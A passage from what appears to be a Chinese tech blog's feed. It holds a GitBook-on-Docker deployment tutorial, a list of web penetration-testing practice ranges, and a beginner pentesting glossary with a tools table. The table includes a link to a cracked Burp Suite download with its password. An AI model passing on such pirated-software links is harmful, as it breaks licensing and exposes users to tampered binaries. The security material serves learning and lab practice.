3.2.3 版本，这里使用 Docker 实现。</p><p>且为了方便使用，我已将其打包成 Docker 镜像，其 Dockerfile 脚本已上传到 GitHub： <a href="https://github.com/lyy289065406/gitbook-server-docker">gitbook-server-docker</a> 。</p><blockquote><p>注：<br>　因为 gitbook 服务是运行在 Docker 中，所以不论使用哪个平台，都要预装好 Docker 环境<br>　但是本文所使用的基础镜像是基于 Linux 的，因此 Docker in Windows 是无法直接安装的<br>　所以针对 Windows 10 ，推荐使用 WSL ( Windows Subsystem for Linux )<br>　通过 WSL 安装 Ubuntu 系统，然后再<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">在 Ubuntu 里面安装 Docker Deamon</a><br>　最后 Docker in Windows 做端口映射，就可以实现 Windows 到 Linux 的无缝对接<br>　具体的 Windows Docker 环境部署方法可参考 《<a href="https://www.jianshu.com/p/97d16b68045f">简书： Win10 内置 Ubuntu 完美使用 Docker in Windows</a>》<br>　至于 Linux 和 Mac 则简单得多，直接安装 Docker Deamon 即可使用，具体方法自行谷歌</p></blockquote><p><img src="./00.png"></p><h3 id="构建-GitBook-镜像"><a href="#构建-GitBook-镜像" class="headerlink" title="构建 GitBook 镜像"></a>构建 GitBook 镜像</h3><p>首先安装 <code>git</code> 命令行工具，然后 <code>clone</code> 上述的 <a href="https://github.com/lyy289065406/gitbook-server-docker">gitbook-server-docker</a> 仓库到本地：</p><p><code>git clone https://github.com/lyy289065406/gitbook-server-docker</code></p><p>在命令行环境下 <strong>打开本地仓库目录</strong> 。 Docker 脚本已经编排好在 <a href="https://github.com/lyy289065406/gitbook-server-docker/blob/master/Dockerfile"><code>./Dockerfile</code></a> 中，可以不修改直接使用。</p><p>构建 Docker 镜像（镜像名称 <code>exp/gitbook-server</code> 可根据 Docker 规范自定义修改）：</p><p><code>docker build . -t exp/gitbook-server:latest</code></p><p><img src="./01.png"></p><p>至此镜像已经安装完毕，下文主要是测试 GitBook 镜像是否可用。</p><h3 id="初始化-GitBook-项目"><a href="#初始化-GitBook-项目" class="headerlink" title="初始化 GitBook 项目"></a>初始化 GitBook 项目</h3><p>在 Docker 镜像中执行命令 <code>gitbook init</code>：</p><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" exp/gitbook-server gitbook init</code></p><blockquote><p>　该命令会自动创建默认的 GitBook 目录结构。<br>　实际效果就是在工作目录 <code>./gitbook</code> 下创建两个符合 GitBook 语法的文件 <code>README.md</code> 和 <code>SUMMARY.md</code> 。<br>　<em>更多的 GitBook 语法详见 《<a href="https://yangjh.oschina.io/gitbook/">GitBook 学习笔记</a>》</em></p></blockquote><h3 id="关于-GitBook-目录结构说明"><a href="#关于-GitBook-目录结构说明" class="headerlink" title="关于 GitBook 目录结构说明"></a>关于 GitBook 目录结构说明</h3><p><img src="./02.png"></p><pre><code>exp-blog|-- .gitignore  ..............  [Git 过滤配置]|-- Dockerfile  ..............  [构建 GitBook 本地服务器的 Docker 脚本]|-- build.ps1  ...............  [重新编译博客变更内容，并使其适用于 Github Pages（Windows 脚本）]|-- build.sh  ................  [重新编译博客变更内容，并使其适用于 Github Pages（Linux 脚本）]|-- index.html  ..............  [Github Pages 首页（会自动跳转到博客首页）]|-- gitbook  .................  [GitBook 的工作目录，存储博客数据]|   |-- _book  ...............  [用 GitBook 编译生成的静态网站数据，用于本地测试（因含下划线不被 Github Pages 支持）]|   |-- book  ................  [用 build.ps1/sh 脚本所复制 _book 目录的镜像，用于 Github Pages 发布]|   |-- res  .................  [存储博客资源的目录]|   |-- markdown  ............  [存储博客文章的目录（只有 *.md 文件）]|   |-- README.md  ...........  [博客介绍文档（固定文件）]|   |-- SUMMARY.md  ..........  [博客目录索引（固定文件）]|   |-- node_modules  ........  [GitBook 的插件目录]|   |-- book.json  ...........  [GitBook 的插件配置]|   └-- package-lock.json  ...  [nodojs 插件依赖关系文件（安装插件时会自动更新）]|-- LICENSE  .................  [版权说明]└-- README.md  ...............  [此仓库的说明文档]</code></pre><h3 id="构建-GitBook-项目"><a href="#构建-GitBook-项目" class="headerlink" title="构建 GitBook 项目"></a>构建 GitBook 项目</h3><p>在 Docker 镜像中执行命令 <code>gitbook build</code>：</p><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" exp/gitbook-server gitbook build</code></p><blockquote><p>　该命令会根据 GitBook 文件 <code>README.md</code> 和 <code>SUMMARY.md</code> 构建 html 项目 。<br>　实际效果就是在工作目录 <code>./gitbook</code> 下构建目录名为 <code>_book</code> 的静态网页文件 。<br>　本地可以通过 <code>./gitbook/_book/index.html</code> 测试访问 。</p></blockquote><p><img src="./03.png"></p><h3 id="启动-GitBook-服务"><a href="#启动-GitBook-服务" class="headerlink" title="启动 GitBook 服务"></a>启动 GitBook 服务</h3><p>在 Docker 镜像中执行命令 <code>gitbook serve</code>：</p><p><code>docker run -d --rm -v "$PWD/gitbook:/gitbook" -p 4000:4000 exp/gitbook-server gitbook serve</code></p><blockquote><p>该命令效果就是构建一个可以访问 <code>./gitbook/_book/index.html</code> 的 Web 服务。</p></blockquote><p><img src="./04.png"></p><h3 id="关于前文中-Docker-命令的参数的含义"><a href="#关于前文中-Docker-命令的参数的含义" class="headerlink" title="关于前文中 Docker 命令的参数的含义"></a>关于前文中 Docker 命令的参数的含义</h3><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" -p 4000:4000 exp/gitbook-server &lt;Command&gt;</code></p><ul><li><code>docker run</code>：运行镜像</li><li><code>--rm</code>：退出镜像后自动删除运行时产生的数据（此镜像目的是提供 GitBook 的运行环境，故没必要保留数据）</li><li><code>-v "$PWD/gitbook:/gitbook"</code>：把本地工作目录 <code>$PWD/gitbook</code> 挂载到镜像的工作目录 <code>/gitbook</code> （这样运行 GitBook 期间的工作数据就会从本地映射到镜像内，即使镜像退出运行，数据依旧会保留在本地）</li><li><code>-p 4000:4000</code>：把镜像内 GitBook 的 4000 服务端口暴露到本地物理机的 4000 端口</li><li><code>exp/gitbook-server</code>：目标镜像名称</li><li><code>&lt;Command&gt;</code>：要在镜像内执行的命令，如 <code>gitbook serve</code> 等，更多命令可见 <a href="https://github.com/GitbookIO/gitbook-cli">gitbook-cli</a></li></ul><hr><h2 id="发布站点到-GitHub-Page"><a href="#发布站点到-GitHub-Page" class="headerlink" title="发布站点到 GitHub Page"></a>发布站点到 GitHub Page</h2><p>事实上只需要把前面通过 <code>gitbook build</code> 所生成的 <code>_book</code> 目录 commit 到 GitHub， 然后在 GitHub 仓库的 Settings 中启用 GitHub Page 即可。</p><p>这里需要注意的是：</p><ul><li>GitHub Page 不允许站点路径以下划线开头，因此在 commit 前需要把 <code>_book</code> 重命名为 <code>book</code></li><li>GitHub Page 的站点主页是仓库的根目录，而 GitBook 的站点主页是在 <code>_book</code> 目录下，为了统一主页，可以在 GitHub 仓库根目录添加一个 <code>index.html</code> 文件，内容如下：</li></ul><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>robots<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noarchive<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>EXP<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>EXP-BLOG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 自动从 Github Pages 的首页跳转到 GitBook 的首页 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0; url<span class="token punctuation">=</span>./gitbook/book/index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="站点优化：安装-GitBook-插件"><a href="#站点优化：安装-GitBook-插件" class="headerlink" title="站点优化：安装 GitBook 插件"></a>站点优化：安装 GitBook 插件</h2><p>GitBook 的精粹在于丰富的插件以扩展其功能，插件可通过工作目录下的 <a href="https://github.com/lyy289065406/exp-blog/blob/master/gitbook/book.json"><code>book.json</code></a> 配置并控制，相关说明见 <a href="https://docs.gitbook.com/v2-changes/important-differences#plugins">官方文档</a>。</p><p>推荐 GitBook 安装的插件可参考 <a href="http://gitbook.zhangjikai.com/plugins.html">这份清单</a> 。</p><p>根据插件命名约定，若 <strong>插件名称</strong> 为 <code>prism</code> ，则其对应 <strong>安装包名称</strong> 为 <code>gitbook-plugin-prism</code> 。</p><p>以 <code>prism</code> 插件为例，安装方式有两种：</p><ul><li>通过 GitBook 安装：把插件名称 <code>prism</code> 添加到 <code>book.json</code> 的 <code>plugins</code> 列表，执行 <code>gitbook install</code> 命令</li><li>通过 nodejs 安装：执行 <code>npm install gitbook-plugin-prism</code> 命令安装指定插件，然后把插件名称 <code>prism</code> 配置到 <code>book.json</code> 的 <code>plugins</code> 列表使其生效</li></ul><blockquote><p>　方法一每次执行都会检查现有插件是否需要更新。<br>　方法二只有特定插件受影响，适合于存在自定义修改过插件代码的情况。</p></blockquote><p>注意， Guthub Pages 不支持使用了 Octopress 框架的插件，详见 《<a href="https://help.github.com/en/github/working-with-github-pages/about-github-pages-and-jekyll">About GitHub Pages and Jekyll</a>》 。</p><p>若使用了这类插件，Guthub Pages 是无法发布成功的。 判定是不是使用了这类插件的方法也很简单：</p><ul><li>提交变更内容后，点击 Github 仓库下的 branch 查看 master 分支</li><li>master 分支会提示最近提交内容的 Guthub Pages 构建情况</li><li>若构建失败，可以点击 Details 查看详情</li><li>假如提示 <code>is not a recognised Liquid tag</code> 说明就是采用了 Octopress 框架的插件</li></ul><p><img src="./08.png"><br><img src="./09.png"><br><img src="./10.png"></p><h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2><p>通过 GitHub Page 发布的站点有个问题，就是 URL 地址不方便记忆。</p><p>如果有申请个人域名的话，是可以自定义 GitHub Page 域名的。</p><p>首先需要购买域名解析服务，添加 CNAME 规则把个人域名解析到 GitHub Page，然后再在 GitHub Page 配置个人域名即可。</p><p><img src="./12.png"><br><img src="./13.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitBook </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB 渗透靶场整合</title>
      <link href="/articles/safe/web-shen-tou-ba-chang-zheng-he/"/>
      <url>/articles/safe/web-shen-tou-ba-chang-zheng-he/</url>
      
        <content type="html"><![CDATA[<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>推荐新手首选靶场，配置简单，需下载 phpstudy 和靶场文件包，简单部署之后即可访问。</p><p>包含了常见的web漏洞（php的），每个漏洞分为四个等级，每个等级都有源码查看，最高等级的源码是最安全的。</p><ul><li>DVWA靶场源码下载：<a href="http://www.dvwa.co.uk/index.php">http://www.dvwa.co.uk/index.php</a></li><li>phpstudy官方下载：<a href="https://m.xp.cn/">https://m.xp.cn/</a></li></ul><h2 id="网络安全实验室"><a href="#网络安全实验室" class="headerlink" title="网络安全实验室"></a>网络安全实验室</h2><p>做题的靶场，也是一个基础靶场，是一个在线的靶场。</p><ul><li>地址：<a href="http://hackinglab.cn/">http://hackinglab.cn/</a></li></ul><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>sqli-labs 包含了大多数的 sql 注入类型，以一种闯关模式，对于 sql 注入进行漏洞利用。</p><p>sql 注入练习首选，同样需要 phpstudy （或者 amp 环境）加靶场源码包部署。</p><ul><li>sqli-labs 靶场源码下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li></ul><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>upload-labs 包含了大多数文件上传类型，一个包含几乎所有类型上传漏洞的靶场。</p><p>目前更新到 20 关。</p><ul><li>靶场源码下载地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li></ul><h2 id="xss-challenges"><a href="#xss-challenges" class="headerlink" title="xss challenges"></a>xss challenges</h2><p>xsschallenges 是一个专对于 XSS 漏洞练习的的靶场，包含了各种绕过，各种姿势的 XSS 利用。</p><ul><li>在线靶场地址：<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></li></ul><h2 id="必火网络安全-必火靶机三"><a href="#必火网络安全-必火靶机三" class="headerlink" title="必火网络安全-必火靶机三"></a>必火网络安全-必火靶机三</h2><p>这个在线靶场涵盖了大多数的 Web 漏洞，跟 DVWA 的机制差不多，还有 CTF 题可做，个人认为是一个比较全的一个 Web 漏洞靶场。</p><ul><li>在线靶场地址：<a href="https://www.bihuoedu.com/">https://www.bihuoedu.com/</a></li></ul><h2 id="OWASP-Broken-Web-Applications-Project"><a href="#OWASP-Broken-Web-Applications-Project" class="headerlink" title="OWASP Broken Web Applications Project"></a>OWASP Broken Web Applications Project</h2><p>靶场由 OWASP 专门为 Web 安全研究者和初学者开发的一个靶场，包含了大量存在已知安全漏洞的训练实验环境和真实 Web 应用程序。</p><p>靶场在官网下载后是一个集成虚拟机，可以直接在 vm 中打开，物理机访问 ip 即可访问到 web 平台，使用 root/owaspbwa 登入就会返回靶场地址，直接可以访问靶场。</p><p>DVWA 适合了解漏洞和简单的漏洞利用，owaspbwa 则就更贴近实际的复杂的业务环境。</p><ul><li>靶场虚拟机下载地址：<a href="https://sourceforge.net/projects/owaspbwa/">https://sourceforge.net/projects/owaspbwa/</a></li></ul><h2 id="VulHub"><a href="#VulHub" class="headerlink" title="VulHub"></a>VulHub</h2><p>这是一个开源的漏洞环境项目，包含了很多不同的环境，是继 owaspbwa 以后，漏洞种类多，环境丰富的一个靶场，并且收集的漏洞也比较新，适合作为一个长期的学习、实战靶场。</p><p>Vulhub 是一个基于 docker 和 docker-compose 的漏洞环境集合，需要在 linux 下安装 docker，有 docker 环境之后，即可一条语句启动一个漏洞环境。</p><ul><li>vulhub 指导安装地址：<a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h2 id="vulnhub"><a href="#vulnhub" class="headerlink" title="vulnhub"></a>vulnhub</h2><p>Vulnhub 是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用 VMware 或者 VirtualBox 运行。</p><p>每个镜像会有破解的目标，大多是 Boot2root，从启动虚机到获取操作系统的 root 权限和查看 flag。</p><p>相比于 vulhub，这是采用的虚拟机镜像，前者是采用 docker。</p><ul><li>靶场地址：<a href="https://www.vulnhub.com/">https://www.vulnhub.com</a></li></ul><h2 id="webug4-0"><a href="#webug4-0" class="headerlink" title="webug4.0"></a>webug4.0</h2><p>基础环境是基于 PHP/mysql 制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。</p><p>部分漏洞是基于 Windows 操作系统的漏洞所以将 WeBug 的 Web 环境都装在了一个纯净版的 Windows 虚拟机中。</p><ul><li>虚拟机下载地址：<a href="https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg">https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg</a></li><li>提取码: 5er7</li></ul><h2 id="vulnstack"><a href="#vulnstack" class="headerlink" title="vulnstack"></a>vulnstack</h2><p>红蓝对抗，内网、域渗透最新靶场：</p><ul><li>地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 解题报告</title>
      <link href="/articles/safe/ctf-solving-reports/"/>
      <url>/articles/safe/ctf-solving-reports/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://github.com/lyy289065406/CTF-Solving-Reports/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://github.com/lyy289065406/CTF-Solving-Reports/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 解题报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子渗透测试入门资源：参考书、课程、工具、认证</title>
      <link href="/articles/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/"/>
      <url>/articles/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初入渗透测试领域，过程中遇到不少错综复杂的知识，也遇到不少坑，特此记录，慢慢整理慢慢填。</p><h2 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h2><table><thead><tr><th align="center">名词</th><th align="center">全称</th><th align="center">解析</th></tr></thead><tbody><tr><td align="center"><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK</a></td><td align="center">Penetration Testing with Kali Linux</td><td align="center">Kali-Linux 渗透测试培训课程</td></tr><tr><td align="center"><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP</a></td><td align="center">Offensive Security Certified Professional</td><td align="center">攻防安全专家认证</td></tr><tr><td align="center"><a href="https://www.owasp.org/">OWASP</a></td><td align="center">Open Web Application Security Project</td><td align="center">开放式Web应用程序安全项目<br>它提供有关计算机和互联网应用程序的公正、实际、<br>有成本效益的信息，如<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project">《2017 Top 10 应用风险评估报告》</a><br>其目的是协助个人、企业和机构来发现和使用可信赖软件</td></tr><tr><td align="center">SCAP</td><td align="center">Security Content Automation Protocol</td><td align="center">安全内容自动化协议<br>已成立了<a href="http://www.scap.org.cn/">SCAP中文社区</a>，集成了协议框架中的CVE、CCE、<br>CPE、CWE、CVSS、OVAL等6种网络安全相关标准数据库</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities and Exposures</td><td align="center">公共漏洞与暴露<br>每个CVE都有唯一编号，是一个漏洞字典表</td></tr><tr><td align="center">EXP</td><td align="center">Exploit</td><td align="center">安全术语，指可利用点（如漏洞、代码等）</td></tr><tr><td align="center">vul</td><td align="center">Vulnerabilities</td><td align="center">安全术语，泛指漏洞</td></tr><tr><td align="center">PoC</td><td align="center">Proof of Concept</td><td align="center">漏洞的概念证明，常见是一段可复盘漏洞的代码</td></tr><tr><td align="center">payload</td><td align="center">-</td><td align="center">安全术语，有效载荷，泛指漏洞利用成功后所要做的事情<br>（如Cracker会做一些有害的或者恶性的动作）</td></tr><tr><td align="center">shellcode</td><td align="center">-</td><td align="center">安全术语，payload的一种，让攻击者获得 shell<br>（由于其建立正向/反向shell而得名）</td></tr><tr><td align="center">WAF</td><td align="center">Web Application Firewall</td><td align="center">Web应用防护系统（也称为：网站应用级入侵防御系统）</td></tr><tr><td align="center">Fuzz</td><td align="center">Fuzz testing</td><td align="center">模糊测试，一种安全测试方法<br>它介于完全的手工测试和完全的自动化测试之间<br>而手工测试是指渗透测试，即模拟Cracker进入系统查找漏洞</td></tr><tr><td align="center">社工</td><td align="center">社会工程学攻击</td><td align="center">安全术语，泛指通过心理战术，欺诈他人<br>以收集信息、行骗和入侵计算机系统的行为</td></tr><tr><td align="center">XSS</td><td align="center">Cross Site Scripting</td><td align="center">跨站脚本攻击（缩写首字母为X是为了不与CSS混淆）<br>根据攻击特点分为：反射型XSS、存储型XSS、DOM-XSS</td></tr><tr><td align="center">DoS</td><td align="center">Denial of Service</td><td align="center">拒绝服务攻击</td></tr><tr><td align="center">DDoS</td><td align="center">Distributed Denial of Service</td><td align="center">分布式拒绝服务攻击</td></tr><tr><td align="center">SQLi</td><td align="center">SQL Inject</td><td align="center">SQL注入式攻击</td></tr><tr><td align="center">CSRF</td><td align="center">Cross-site request forgery</td><td align="center">跨站请求伪造攻击</td></tr><tr><td align="center">CORS</td><td align="center">Cross-Origin Resource Sharing</td><td align="center">跨源资源共享</td></tr><tr><td align="center"><a href="https://gdpr-info.eu/">GDPR</a></td><td align="center">General Data Protection Regulation</td><td align="center">通用数据保护条例，在2018-5-25由欧盟正式出台<br>该条例的适用范围极为广泛，任何收集、传输、保留<br>或处理涉及到欧盟所有成员国内的个人信息的机构组织<br>均受该条例的约束，号称<a href="http://zhuanlan.51cto.com/art/201801/563326.htm">史上最严个人数据保护条例</a></td></tr></tbody></table><blockquote><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 <code>PoC</code>，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了他家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 <code>Exp</code>，你在他家所做的行为就是不同的 <code>Payload</code>，就把窃听器当作 <code>Shellcode</code> 吧！</p></blockquote><h2 id="Pwk课程与OSCP证书"><a href="#Pwk课程与OSCP证书" class="headerlink" title="Pwk课程与OSCP证书"></a>Pwk课程与OSCP证书</h2><p><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/"><strong>OSCP认证</strong></a>：是一个专门针对 <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/"><strong>PwK课程</strong></a> 的国际安全专业认证。该认证机构声称，OSCP认证是一个区别于所有其它认证的考试，考试全程采取手动操作实战的方式，而不设笔试环节。这是在安全领域含金量非常高的国际认证。</p><p><strong>认证条件</strong>：无</p><p><strong>考试模式</strong>：OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。基于难度级别，成功执行的攻击会获得相应的积分。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。</p><p><strong>考试费用</strong>：最低 $ 800 （30天实验室访问学习 + 考试认证）</p><p><strong>相关链接</strong>：</p><ul><li><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP概述</a> </li><li><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK培训材料</a> </li></ul><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>Capture The Flag，夺旗赛。</p><p>通过在线靶场进行实战，磨炼网络安全技巧的一种竞技。这里推荐几个免费的 CTF 站点：</p><ul><li><a href="https://www.root-me.org/?lang=en">Root Me</a></li><li><a href="https://cgctf.nuptsast.com/challenges#Web">CG-CTF</a></li><li><a href="https://github.com/vulhub/vulhub">Vulhub</a></li></ul><p>不建议找答案，勇敢地刷题吧！ 可以很好地锻炼发掘EXP的能（nao）力（dong）~</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table><thead><tr><th align="center">工具</th><th align="center">简介</th><th align="center">下载</th></tr></thead><tbody><tr><td align="center">Kali-Linux</td><td align="center">渗透测试的必备工具包<br>Kali是一个基于 Debian 的 Linux 发行版，专门用于渗透测试的工具系统<br>大多数做安全测试的渗透和审计开源工具都被尽可能多地囊括在内</td><td align="center"><a href="https://www.kali.org/downloads/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">CVEList</td><td align="center">CVE字典表</td><td align="center"><a href="https://github.com/CVEProject/cvelist" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">SecLists</td><td align="center">OWASP维护的一个安全信息列表集合<br>该集合包括了用于渗透的各种类型的列表，<br>这些列表包含了237个字典文件以及常用的 Web Shell 攻击载荷，<br>字典文件类型众多，如用户名、密码、域名、敏感数据特征码、模糊测试载荷等</td><td align="center"><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Exploit Database</td><td align="center">可利用漏洞数据库（在线）<br>罗列了最新被发现的CVE和PoC等信息，可用于学习漏洞原理和复盘</td><td align="center"><a href="https://www.exploit-db.com/" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">SearchSploit</td><td align="center">与 Exploit Database 配套的命令行工具包（已集成到Kali）<br>它把Exploit Database的数据保存在本地机器（攻击方），<br>通过搜集目标机器（防御方）的信息，在本地发现这些信息的EXP，<br>然后在本地机器提取对应的PoC上传到目标机器实现渗透</td><td align="center"><a href="https://www.exploit-db.com/searchsploit" target="_blank" rel="nofollow">官网</a></td></tr><tr><td align="center">Hydra</td><td align="center">弱密码爆破工具（已集成到Kali）</td><td align="center"><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="nofollow">Github</a></td></tr><tr><td align="center">Burp Suite</td><td align="center">用于攻击web 应用程序的集成平台（谁用谁知道）</td><td align="center"><a href="https://portswigger.net/burp" target="_blank" rel="nofollow">官网</a><br><a href="https://share.weiyun.com/5LDUkNW" target="_blank" rel="nofollow">破解版</a><br>密：gsqygf</td></tr><tr><td align="center">Arachni</td><td align="center">基于Ruby的Web漏洞扫描工具<br>算不上强大但有其特色，用于评估web应用程序的安全性<br>不仅能对基本的静态或CMS网站进行扫描，<br>还能识别大部分平台的指纹信息（硬盘序列号和网卡物理地址）</td><td align="center"><a href="http://www.arachni-scanner.com/" target="_blank" rel="nofollow">官网</a><br><a 